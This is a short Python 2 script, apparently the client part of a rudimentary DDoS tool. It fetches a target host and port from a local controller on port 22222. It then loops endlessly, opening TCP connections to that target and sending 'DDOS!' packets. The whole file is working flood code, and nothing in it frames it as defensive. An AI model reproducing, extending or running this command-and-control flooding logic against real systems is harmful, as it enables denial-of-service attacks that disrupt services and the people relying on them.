#!/usr/bin/python           # This is client.py file

import sys                  # Import sys module
import socket               # Import socket module

def attack(host="",port=80):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error,msg:
        print"Error:",msg
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print"Unresolved hostname."
            sys.exit()
        else:
            packet = str('DDOS!').encode('utf-8')
            if sock.connect_ex((host,port)) == 0:
                if sock.sendall(packet) == None:
                    print"Packet sent successfully!"
                    #print sock.recv(1024)        # Prints echo from test_server
                    sock.close()
                else:
                    print"Error while sending!"
                    sys.exit()

if __name__ == "__main__":

    s = socket.socket()         # Create a socket object
    server_host = socket.gethostname() # Get local machine name
    server_port = 22222                # Reserve a port for your service.
    s.connect((server_host, server_port))
    data = s.recv(1024)
    print data
    target_host, target_port = data.split()[-2:]
    target_port = int(target_port)
    print 'Target Host Address: '+target_host+'\nTarget Port Number: '+str(target_port)
    s.close()                     # Close the socket when done test

    while True:
        attack(target_host, target_port)
